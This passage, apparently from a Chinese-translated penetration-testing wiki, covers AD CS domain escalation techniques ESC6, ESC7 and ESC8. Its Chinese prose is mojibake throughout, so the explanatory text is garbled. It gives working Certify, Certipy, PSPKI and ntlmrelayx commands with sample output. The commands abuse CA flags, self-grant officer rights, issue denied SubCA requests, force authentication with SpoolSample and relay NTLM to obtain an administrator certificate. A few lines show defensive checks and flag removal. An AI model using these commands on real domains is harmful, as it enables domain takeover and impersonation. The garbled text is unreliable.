<li>ç‰¹å®šå®¹å™¨è·¯å¾„<code>CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=&lt;COM&gt;</code>å†…çš„ä»»ä½•åä»£ADå¯¹è±¡æˆ–å®¹å™¨ã€‚è¯¥è·¯å¾„åŒ…æ‹¬ä½†ä¸é™äºè¯ä¹¦æ¨¡æ¿å®¹å™¨ã€è®¤è¯æœºæ„å®¹å™¨ã€NTAuthCertificateså¯¹è±¡å’Œæ³¨å†ŒæœåŠ¡å®¹å™¨ç­‰å®¹å™¨å’Œå¯¹è±¡ã€‚</li>
</ul>
<p>å¦‚æœä½æƒé™æ”»å‡»è€…è®¾æ³•æ§åˆ¶è¿™äº›å…³é”®ç»„ä»¶ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼ŒPKIç³»ç»Ÿçš„å®‰å…¨æ€§å¯èƒ½ä¼šå—åˆ°å¨èƒã€‚</p>
<h2 id="editf_attributesubjectaltname2---esc6"><a class="header" href="#editf_attributesubjectaltname2---esc6">EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</a></h2>
<h3 id="explanation-4"><a class="header" href="#explanation-4">Explanation</a></h3>
<p>åœ¨<a href="https://cqureacademy.com/blog/enhanced-key-usage"><strong>CQure Academyå¸–å­</strong></a>ä¸­è®¨è®ºçš„ä¸»é¢˜ä¹Ÿæ¶‰åŠ**<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code><strong>æ ‡å¿—çš„å½±å“ï¼Œå¦‚å¾®è½¯æ‰€è¿°ã€‚å½“åœ¨è®¤è¯æœºæ„ï¼ˆCAï¼‰ä¸Šæ¿€æ´»æ­¤é…ç½®æ—¶ï¼Œå…è®¸åœ¨</strong>ä»»ä½•è¯·æ±‚<strong>çš„</strong>ä¸»é¢˜å¤‡ç”¨åç§°<strong>ä¸­åŒ…å«</strong>ç”¨æˆ·å®šä¹‰çš„å€¼**ï¼ŒåŒ…æ‹¬é‚£äº›ç”±Active DirectoryÂ®æ„å»ºçš„è¯·æ±‚ã€‚å› æ­¤ï¼Œè¿™ä¸€æ¡æ¬¾å…è®¸<strong>å…¥ä¾µè€…</strong>é€šè¿‡ä¸ºåŸŸ<strong>èº«ä»½éªŒè¯</strong>è®¾ç½®çš„<strong>ä»»ä½•æ¨¡æ¿</strong>è¿›è¡Œæ³¨å†Œâ€”â€”ç‰¹åˆ«æ˜¯é‚£äº›å¯¹<strong>æ— ç‰¹æƒ</strong>ç”¨æˆ·æ³¨å†Œå¼€æ”¾çš„æ¨¡æ¿ï¼Œå¦‚æ ‡å‡†ç”¨æˆ·æ¨¡æ¿ã€‚ç»“æœï¼Œå¯ä»¥è·å¾—è¯ä¹¦ï¼Œä½¿å…¥ä¾µè€…èƒ½å¤Ÿä½œä¸ºåŸŸç®¡ç†å‘˜æˆ–<strong>åŸŸå†…çš„ä»»ä½•å…¶ä»–æ´»åŠ¨å®ä½“</strong>è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p><strong>æ³¨æ„</strong>ï¼šé€šè¿‡<code>certreq.exe</code>ä¸­çš„<code>-attrib "SAN:"</code>å‚æ•°å°†<strong>å¤‡ç”¨åç§°</strong>é™„åŠ åˆ°è¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆCSRï¼‰çš„æ–¹æ³•ï¼ˆç§°ä¸ºâ€œåç§°å€¼å¯¹â€ï¼‰ä¸ESC1ä¸­SANçš„åˆ©ç”¨ç­–ç•¥å­˜åœ¨<strong>å¯¹æ¯”</strong>ã€‚åœ¨è¿™é‡Œï¼ŒåŒºåˆ«åœ¨äº<strong>è´¦æˆ·ä¿¡æ¯çš„å°è£…æ–¹å¼</strong>â€”â€”åœ¨è¯ä¹¦å±æ€§ä¸­ï¼Œè€Œä¸æ˜¯æ‰©å±•ä¸­ã€‚</p>
<h3 id="abuse-2"><a class="header" href="#abuse-2">Abuse</a></h3>
<p>è¦éªŒè¯è¯¥è®¾ç½®æ˜¯å¦å·²æ¿€æ´»ï¼Œç»„ç»‡å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸<code>certutil.exe</code>ï¼š</p>
<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
</code></pre>
<p>æ­¤æ“ä½œæœ¬è´¨ä¸Šä½¿ç”¨<strong>è¿œç¨‹æ³¨å†Œè¡¨è®¿é—®</strong>ï¼Œå› æ­¤ï¼Œå¦ä¸€ç§æ–¹æ³•å¯èƒ½æ˜¯ï¼š</p>
<pre><code class="language-bash">reg.exe query \\&lt;CA_SERVER&gt;\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\&lt;CA_NAME&gt;\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
</code></pre>
<p>åƒ <a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a> å’Œ <a href="https://github.com/ly4k/Certipy"><strong>Certipy</strong></a> è¿™æ ·çš„å·¥å…·èƒ½å¤Ÿæ£€æµ‹åˆ°è¿™ç§é”™è¯¯é…ç½®å¹¶åŠ ä»¥åˆ©ç”¨ï¼š</p>
<pre><code class="language-bash"># Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
</code></pre>
<p>è¦æ›´æ”¹è¿™äº›è®¾ç½®ï¼Œå‡è®¾æ‹¥æœ‰<strong>åŸŸç®¡ç†å‘˜</strong>æƒé™æˆ–åŒç­‰æƒé™ï¼Œå¯ä»¥ä»ä»»ä½•å·¥ä½œç«™æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
</code></pre>
<p>è¦åœ¨æ‚¨çš„ç¯å¢ƒä¸­ç¦ç”¨æ­¤é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤æ ‡å¿—ï¼š</p>
<pre><code class="language-bash">certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
</code></pre>
<p>{% hint style="warning" %}
åœ¨2022å¹´5æœˆçš„å®‰å…¨æ›´æ–°ä¹‹åï¼Œæ–°å‘è¡Œçš„<strong>è¯ä¹¦</strong>å°†åŒ…å«ä¸€ä¸ª<strong>å®‰å…¨æ‰©å±•</strong>ï¼Œè¯¥æ‰©å±•åŒ…å«<strong>è¯·æ±‚è€…çš„ <code>objectSid</code> å±æ€§</strong>ã€‚å¯¹äºESC1ï¼Œæ­¤SIDæºè‡ªæŒ‡å®šçš„SANã€‚ç„¶è€Œï¼Œå¯¹äº<strong>ESC6</strong>ï¼ŒSIDåæ˜ <strong>è¯·æ±‚è€…çš„ <code>objectSid</code></strong>ï¼Œè€Œä¸æ˜¯SANã€‚<br />
è¦åˆ©ç”¨ESC6ï¼Œç³»ç»Ÿå¿…é¡»å¯¹ESC10ï¼ˆå¼±è¯ä¹¦æ˜ å°„ï¼‰æ•æ„Ÿï¼Œè¯¥æ˜ å°„ä¼˜å…ˆè€ƒè™‘<strong>SANè€Œä¸æ˜¯æ–°çš„å®‰å…¨æ‰©å±•</strong>ã€‚
{% endhint %}</p>
<h2 id="æ˜“å—æ”»å‡»çš„è¯ä¹¦é¢å‘æœºæ„è®¿é—®æ§åˆ¶---esc7"><a class="header" href="#æ˜“å—æ”»å‡»çš„è¯ä¹¦é¢å‘æœºæ„è®¿é—®æ§åˆ¶---esc7">æ˜“å—æ”»å‡»çš„è¯ä¹¦é¢å‘æœºæ„è®¿é—®æ§åˆ¶ - ESC7</a></h2>
<h3 id="æ”»å‡»-1"><a class="header" href="#æ”»å‡»-1">æ”»å‡» 1</a></h3>
<h4 id="è§£é‡Š-1"><a class="header" href="#è§£é‡Š-1">è§£é‡Š</a></h4>
<p>è¯ä¹¦é¢å‘æœºæ„çš„è®¿é—®æ§åˆ¶é€šè¿‡ä¸€ç»„æƒé™æ¥ç»´æŠ¤ï¼Œè¿™äº›æƒé™ç®¡ç†CAçš„æ“ä½œã€‚å¯ä»¥é€šè¿‡è®¿é—®<code>certsrv.msc</code>ï¼Œå³é”®å•å‡»CAï¼Œé€‰æ‹©å±æ€§ï¼Œç„¶åå¯¼èˆªåˆ°å®‰å…¨é€‰é¡¹å¡æ¥æŸ¥çœ‹è¿™äº›æƒé™ã€‚æ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨PSPKIæ¨¡å—é€šè¿‡ä»¥ä¸‹å‘½ä»¤æšä¸¾æƒé™ï¼š</p>
<pre><code class="language-bash">Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
</code></pre>
<p>è¿™æä¾›äº†å¯¹ä¸»è¦æƒé™çš„è§è§£ï¼Œå³ <strong><code>ManageCA</code></strong> å’Œ <strong><code>ManageCertificates</code></strong>ï¼Œåˆ†åˆ«ä¸â€œCAç®¡ç†å‘˜â€å’Œâ€œè¯ä¹¦ç®¡ç†å™¨â€çš„è§’è‰²ç›¸å…³ã€‚</p>
<h4 id="æ»¥ç”¨-1"><a class="header" href="#æ»¥ç”¨-1">æ»¥ç”¨</a></h4>
<p>åœ¨è¯ä¹¦é¢å‘æœºæ„æ‹¥æœ‰ <strong><code>ManageCA</code></strong> æƒé™ä½¿å¾—ä¸»ä½“èƒ½å¤Ÿä½¿ç”¨ PSPKI è¿œç¨‹æ“æ§è®¾ç½®ã€‚è¿™åŒ…æ‹¬åˆ‡æ¢ <strong><code>EDITF_ATTRIBUTESUBJECTALTNAME2</code></strong> æ ‡å¿—ï¼Œä»¥å…è®¸åœ¨ä»»ä½•æ¨¡æ¿ä¸­æŒ‡å®š SANï¼Œè¿™æ˜¯åŸŸæå‡çš„ä¸€ä¸ªå…³é”®æ–¹é¢ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨ PSPKI çš„ <strong>Enable-PolicyModuleFlag</strong> cmdletï¼Œå¯ä»¥ç®€åŒ–æ­¤è¿‡ç¨‹ï¼Œå…è®¸åœ¨ä¸ç›´æ¥ä¸ GUI äº¤äº’çš„æƒ…å†µä¸‹è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>æ‹¥æœ‰ <strong><code>ManageCertificates</code></strong> æƒé™å¯ä»¥æ‰¹å‡†å¾…å¤„ç†çš„è¯·æ±‚ï¼Œæœ‰æ•ˆåœ°ç»•è¿‡â€œCA è¯ä¹¦ç®¡ç†å™¨æ‰¹å‡†â€ä¿æŠ¤ã€‚</p>
<p>å¯ä»¥ç»“åˆ <strong>Certify</strong> å’Œ <strong>PSPKI</strong> æ¨¡å—æ¥è¯·æ±‚ã€æ‰¹å‡†å’Œä¸‹è½½è¯ä¹¦ï¼š</p>
<pre><code class="language-powershell"># Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
</code></pre>
<h3 id="attack-2"><a class="header" href="#attack-2">Attack 2</a></h3>
<h4 id="explanation-5"><a class="header" href="#explanation-5">Explanation</a></h4>
<p>{% hint style="warning" %}
åœ¨<strong>ä¹‹å‰çš„æ”»å‡»</strong>ä¸­ï¼Œ<strong><code>Manage CA</code></strong> æƒé™è¢«ç”¨æ¥<strong>å¯ç”¨</strong> <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> æ ‡å¿—ä»¥æ‰§è¡Œ <strong>ESC6 æ”»å‡»</strong>ï¼Œä½†è¿™åœ¨ CA æœåŠ¡ï¼ˆ<code>CertSvc</code>ï¼‰é‡å¯ä¹‹å‰ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœã€‚å½“ç”¨æˆ·æ‹¥æœ‰ <code>Manage CA</code> è®¿é—®æƒé™æ—¶ï¼Œç”¨æˆ·ä¹Ÿè¢«å…è®¸<strong>é‡å¯æœåŠ¡</strong>ã€‚ç„¶è€Œï¼Œè¿™<strong>å¹¶ä¸æ„å‘³ç€ç”¨æˆ·å¯ä»¥è¿œç¨‹é‡å¯æœåŠ¡</strong>ã€‚æ­¤å¤–ï¼Œç”±äº 2022 å¹´ 5 æœˆçš„å®‰å…¨æ›´æ–°ï¼Œ<strong>ESC6 å¯èƒ½åœ¨å¤§å¤šæ•°å·²ä¿®è¡¥çš„ç¯å¢ƒä¸­æ— æ³•æ­£å¸¸å·¥ä½œ</strong>ã€‚
{% endhint %}</p>
<p>å› æ­¤ï¼Œè¿™é‡Œæå‡ºäº†å¦ä¸€ä¸ªæ”»å‡»ã€‚</p>
<p>å‰ææ¡ä»¶ï¼š</p>
<ul>
<li>ä»…æœ‰ <strong><code>ManageCA</code> æƒé™</strong></li>
<li><strong><code>Manage Certificates</code></strong> æƒé™ï¼ˆå¯ä»¥ä» <strong><code>ManageCA</code></strong> æˆäºˆï¼‰</li>
<li>è¯ä¹¦æ¨¡æ¿ <strong><code>SubCA</code></strong> å¿…é¡»<strong>å¯ç”¨</strong>ï¼ˆå¯ä»¥ä» <strong><code>ManageCA</code></strong> å¯ç”¨ï¼‰</li>
</ul>
<p>è¯¥æŠ€æœ¯ä¾èµ–äºæ‹¥æœ‰ <code>Manage CA</code> <em>å’Œ</em> <code>Manage Certificates</code> è®¿é—®æƒé™çš„ç”¨æˆ·å¯ä»¥<strong>å‘å‡ºå¤±è´¥çš„è¯ä¹¦è¯·æ±‚</strong>ã€‚<strong><code>SubCA</code></strong> è¯ä¹¦æ¨¡æ¿<strong>æ˜“å— ESC1 æ”»å‡»</strong>ï¼Œä½†<strong>åªæœ‰ç®¡ç†å‘˜</strong>å¯ä»¥æ³¨å†Œè¯¥æ¨¡æ¿ã€‚å› æ­¤ï¼Œ<strong>ç”¨æˆ·</strong>å¯ä»¥<strong>è¯·æ±‚</strong>æ³¨å†Œ <strong><code>SubCA</code></strong> - è¿™å°†è¢«<strong>æ‹’ç»</strong> - ä½†<strong>éšåç”±ç®¡ç†å‘˜å‘æ”¾</strong>ã€‚</p>
<h4 id="abuse-3"><a class="header" href="#abuse-3">Abuse</a></h4>
<p>æ‚¨å¯ä»¥é€šè¿‡å°†è‡ªå·±ç”¨æˆ·æ·»åŠ ä¸ºæ–°å®˜å‘˜æ¥<strong>æˆäºˆè‡ªå·± <code>Manage Certificates</code></strong> è®¿é—®æƒé™ã€‚</p>
<pre><code class="language-bash">certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
</code></pre>
<p><strong><code>SubCA</code></strong> æ¨¡æ¿å¯ä»¥é€šè¿‡ <code>-enable-template</code> å‚æ•°åœ¨ CA ä¸Š <strong>å¯ç”¨</strong>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>SubCA</code> æ¨¡æ¿æ˜¯å¯ç”¨çš„ã€‚</p>
<pre><code class="language-bash"># List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
</code></pre>
<p>å¦‚æœæˆ‘ä»¬æ»¡è¶³äº†æ­¤æ”»å‡»çš„å…ˆå†³æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹<strong>è¯·æ±‚åŸºäº <code>SubCA</code> æ¨¡æ¿çš„è¯ä¹¦</strong>ã€‚</p>
<p><strong>æ­¤è¯·æ±‚å°†è¢«æ‹’ç»</strong>ï¼Œä½†æˆ‘ä»¬å°†ä¿å­˜ç§é’¥å¹¶è®°å½•è¯·æ±‚ IDã€‚</p>
<pre><code class="language-bash">certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
</code></pre>
<p>é€šè¿‡æˆ‘ä»¬çš„ <strong><code>Manage CA</code> å’Œ <code>Manage Certificates</code></strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>ca</code> å‘½ä»¤å’Œ <code>-issue-request &lt;request ID&gt;</code> å‚æ•° <strong>ç­¾å‘å¤±è´¥çš„è¯ä¹¦</strong> è¯·æ±‚ã€‚</p>
<pre><code class="language-bash">certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
</code></pre>
<p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>req</code> å‘½ä»¤å’Œ <code>-retrieve &lt;request ID&gt;</code> å‚æ•° <strong>æ£€ç´¢å·²å‘æ”¾çš„è¯ä¹¦</strong>ã€‚</p>
<pre><code class="language-bash">certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
</code></pre>
<h2 id="ntlm-relay-to-ad-cs-http-endpoints--esc8"><a class="header" href="#ntlm-relay-to-ad-cs-http-endpoints--esc8">NTLM Relay to AD CS HTTP Endpoints â€“ ESC8</a></h2>
<h3 id="è§£é‡Š-2"><a class="header" href="#è§£é‡Š-2">è§£é‡Š</a></h3>
<p>{% hint style="info" %}
åœ¨<strong>å®‰è£…äº†AD CS</strong>çš„ç¯å¢ƒä¸­ï¼Œå¦‚æœå­˜åœ¨<strong>æ˜“å—æ”»å‡»çš„Webæ³¨å†Œç«¯ç‚¹</strong>å¹¶ä¸”è‡³å°‘å‘å¸ƒäº†ä¸€ä¸ª<strong>å…è®¸åŸŸè®¡ç®—æœºæ³¨å†Œå’Œå®¢æˆ·ç«¯èº«ä»½éªŒè¯çš„è¯ä¹¦æ¨¡æ¿</strong>ï¼ˆä¾‹å¦‚é»˜è®¤çš„**<code>Machine</code><strong>æ¨¡æ¿ï¼‰ï¼Œé‚£ä¹ˆ</strong>ä»»ä½•å…·æœ‰æ´»åŠ¨çš„spooleræœåŠ¡çš„è®¡ç®—æœºéƒ½å¯èƒ½è¢«æ”»å‡»è€…æ”»é™·**ï¼
{% endhint %}</p>
<p>AD CSæ”¯æŒå‡ ç§<strong>åŸºäºHTTPçš„æ³¨å†Œæ–¹æ³•</strong>ï¼Œè¿™äº›æ–¹æ³•é€šè¿‡ç®¡ç†å‘˜å¯ä»¥å®‰è£…çš„é™„åŠ æœåŠ¡å™¨è§’è‰²æä¾›ã€‚è¿™äº›ç”¨äºåŸºäºHTTPçš„è¯ä¹¦æ³¨å†Œçš„æ¥å£æ˜“å—<strong>NTLMä¸­ç»§æ”»å‡»</strong>ã€‚æ”»å‡»è€…å¯ä»¥ä»<strong>è¢«æ”»é™·çš„æœºå™¨ä¸Šï¼Œå†’å……ä»»ä½•é€šè¿‡å…¥ç«™NTLMè¿›è¡Œèº«ä»½éªŒè¯çš„ADè´¦æˆ·</strong>ã€‚åœ¨å†’å……å—å®³è€…è´¦æˆ·çš„åŒæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®è¿™äº›Webæ¥å£ï¼Œä»¥<strong>ä½¿ç”¨<code>User</code>æˆ–<code>Machine</code>è¯ä¹¦æ¨¡æ¿è¯·æ±‚å®¢æˆ·ç«¯èº«ä»½éªŒè¯è¯ä¹¦</strong>ã€‚</p>
<ul>
<li><strong>Webæ³¨å†Œæ¥å£</strong>ï¼ˆå¯åœ¨<code>http://&lt;caserver&gt;/certsrv/</code>è®¿é—®çš„æ—§ASPåº”ç”¨ç¨‹åºï¼‰é»˜è®¤ä»…æ”¯æŒHTTPï¼Œè¿™å¹¶ä¸æä¾›å¯¹NTLMä¸­ç»§æ”»å‡»çš„ä¿æŠ¤ã€‚æ­¤å¤–ï¼Œå®ƒæ˜ç¡®ä»…å…è®¸é€šè¿‡å…¶Authorization HTTPå¤´è¿›è¡ŒNTLMèº«ä»½éªŒè¯ï¼Œä½¿å¾—æ›´å®‰å…¨çš„èº«ä»½éªŒè¯æ–¹æ³•å¦‚Kerberosä¸é€‚ç”¨ã€‚</li>
<li><strong>è¯ä¹¦æ³¨å†ŒæœåŠ¡</strong>ï¼ˆCESï¼‰ã€<strong>è¯ä¹¦æ³¨å†Œç­–ç•¥</strong>ï¼ˆCEPï¼‰WebæœåŠ¡å’Œ<strong>ç½‘ç»œè®¾å¤‡æ³¨å†ŒæœåŠ¡</strong>ï¼ˆNDESï¼‰é»˜è®¤é€šè¿‡å…¶Authorization HTTPå¤´æ”¯æŒåå•†èº«ä»½éªŒè¯ã€‚åå•†èº«ä»½éªŒè¯<strong>åŒæ—¶æ”¯æŒ</strong>Kerberoså’Œ<strong>NTLM</strong>ï¼Œå…è®¸æ”»å‡»è€…åœ¨ä¸­ç»§æ”»å‡»æœŸé—´<strong>é™çº§ä¸ºNTLM</strong>èº«ä»½éªŒè¯ã€‚å°½ç®¡è¿™äº›WebæœåŠ¡é»˜è®¤å¯ç”¨HTTPSï¼Œä½†ä»…é HTTPS<strong>å¹¶ä¸èƒ½ä¿æŠ¤å…å—NTLMä¸­ç»§æ”»å‡»</strong>ã€‚HTTPSæœåŠ¡çš„NTLMä¸­ç»§æ”»å‡»ä¿æŠ¤åªæœ‰åœ¨HTTPSä¸é€šé“ç»‘å®šç»“åˆä½¿ç”¨æ—¶æ‰èƒ½å®ç°ã€‚é—æ†¾çš„æ˜¯ï¼ŒAD CSæ²¡æœ‰åœ¨IISä¸Šå¯ç”¨èº«ä»½éªŒè¯çš„æ‰©å±•ä¿æŠ¤ï¼Œè¿™æ˜¯é€šé“ç»‘å®šæ‰€éœ€çš„ã€‚</li>
</ul>
<p>NTLMä¸­ç»§æ”»å‡»çš„ä¸€ä¸ªå¸¸è§<strong>é—®é¢˜</strong>æ˜¯<strong>NTLMä¼šè¯çš„çŸ­æš‚æŒç»­æ—¶é—´</strong>ä»¥åŠæ”»å‡»è€…æ— æ³•ä¸<strong>éœ€è¦NTLMç­¾å</strong>çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚</p>
<p>ç„¶è€Œï¼Œé€šè¿‡åˆ©ç”¨NTLMä¸­ç»§æ”»å‡»è·å–ç”¨æˆ·è¯ä¹¦ï¼Œå¯ä»¥å…‹æœè¿™ä¸€é™åˆ¶ï¼Œå› ä¸ºè¯ä¹¦çš„æœ‰æ•ˆæœŸå†³å®šäº†ä¼šè¯çš„æŒç»­æ—¶é—´ï¼Œå¹¶ä¸”è¯¥è¯ä¹¦å¯ä»¥ä¸<strong>è¦æ±‚NTLMç­¾å</strong>çš„æœåŠ¡ä¸€èµ·ä½¿ç”¨ã€‚æœ‰å…³å¦‚ä½•ä½¿ç”¨è¢«ç›—è¯ä¹¦çš„è¯´æ˜ï¼Œè¯·å‚è§ï¼š</p>
<p>{% content-ref url="account-persistence.md" %}
<a href="account-persistence.html">account-persistence.md</a>
{% endcontent-ref %}</p>
<p>NTLMä¸­ç»§æ”»å‡»çš„å¦ä¸€ä¸ªé™åˆ¶æ˜¯<strong>æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨å¿…é¡»ç”±å—å®³è€…è´¦æˆ·è¿›è¡Œèº«ä»½éªŒè¯</strong>ã€‚æ”»å‡»è€…å¯ä»¥é€‰æ‹©ç­‰å¾…æˆ–å°è¯•<strong>å¼ºåˆ¶</strong>è¿›è¡Œæ­¤èº«ä»½éªŒè¯ï¼š</p>
<p>{% content-ref url="../printers-spooler-service-abuse.md" %}
<a href="../printers-spooler-service-abuse.html">printers-spooler-service-abuse.md</a>
{% endcontent-ref %}</p>
<h3 id="æ»¥ç”¨-2"><a class="header" href="#æ»¥ç”¨-2"><strong>æ»¥ç”¨</strong></a></h3>
<p><a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a>çš„<code>cas</code>æšä¸¾<strong>å¯ç”¨çš„HTTP AD CSç«¯ç‚¹</strong>ï¼š</p>
<pre><code>Certify.exe cas
</code></pre>
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
<p><code>msPKI-Enrollment-Servers</code> å±æ€§è¢«ä¼ä¸šè¯ä¹¦æˆæƒæœºæ„ (CAs) ç”¨äºå­˜å‚¨è¯ä¹¦æ³¨å†ŒæœåŠ¡ (CES) ç«¯ç‚¹ã€‚å¯ä»¥é€šè¿‡åˆ©ç”¨å·¥å…· <strong>Certutil.exe</strong> è§£æå’Œåˆ—å‡ºè¿™äº›ç«¯ç‚¹ï¼š</p>
<pre><code>certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
</code></pre>
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
<h4 id="åˆ©ç”¨-certify"><a class="header" href="#åˆ©ç”¨-certify">åˆ©ç”¨ Certify</a></h4>
<pre><code class="language-bash">## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://&lt;AC Server IP&gt;/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe &lt;victim&gt; &lt;compromised&gt;
</code></pre>
<h4 id="abuse-with-certipy"><a class="header" href="#abuse-with-certipy">Abuse with <a href="https://github.com/ly4k/Certipy">Certipy</a></a></h4>
<p>è¯ä¹¦è¯·æ±‚é»˜è®¤ç”± Certipy åŸºäºæ¨¡æ¿ <code>Machine</code> æˆ– <code>User</code> å‘å‡ºï¼Œè¿™å–å†³äºè¢«ä¸­ç»§çš„è´¦æˆ·åç§°æ˜¯å¦ä»¥ <code>$</code> ç»“å°¾ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>-template</code> å‚æ•°æ¥æŒ‡å®šæ›¿ä»£æ¨¡æ¿ã€‚</p>
<p>ç„¶åå¯ä»¥ä½¿ç”¨åƒ <a href="https://github.com/ly4k/PetitPotam">PetitPotam</a> è¿™æ ·çš„æŠ€æœ¯æ¥å¼ºåˆ¶èº«ä»½éªŒè¯ã€‚åœ¨å¤„ç†åŸŸæ§åˆ¶å™¨æ—¶ï¼Œéœ€è¦æŒ‡å®š <code>-template DomainController</code>ã€‚</p>
<pre><code class="language-bash">certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
</code></pre>
<h2 id="no-security-extension---esc9"><a class="header" href="#no-security-extension---esc9">No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a></a></h2>
<h3 id="è§£é‡Š-3"><a class="header" href="#è§£é‡Š-3">è§£é‡Š</a></h3>
<p>æ–°çš„å€¼ <strong><code>CT_FLAG_NO_SECURITY_EXTENSION</code></strong> (<code>0x80000</code>) å¯¹äº <strong><code>msPKI-Enrollment-Flag</code></strong>ï¼Œç§°ä¸º ESC9ï¼Œé˜²æ­¢åœ¨è¯ä¹¦ä¸­åµŒå…¥ <strong>æ–°çš„ <code>szOID_NTDS_CA_SECURITY_EXT</code> å®‰å…¨æ‰©å±•</strong>ã€‚å½“ <code>StrongCertificateBindingEnforcement</code> è®¾ç½®ä¸º <code>1</code>ï¼ˆé»˜è®¤è®¾ç½®ï¼‰æ—¶ï¼Œè¯¥æ ‡å¿—å˜å¾—ç›¸å…³ï¼Œè¿™ä¸è®¾ç½®ä¸º <code>2</code> ç›¸å¯¹ã€‚åœ¨å¯èƒ½è¢«åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼ŒESC9 çš„ç›¸å…³æ€§åœ¨äºè¾ƒå¼±çš„ Kerberos æˆ– Schannel è¯ä¹¦æ˜ å°„ï¼ˆå¦‚ ESC10ï¼‰å¯èƒ½è¢«åˆ©ç”¨ï¼Œå› ä¸ºç¼ºå°‘ ESC9 ä¸ä¼šæ”¹å˜è¦æ±‚ã€‚</p>
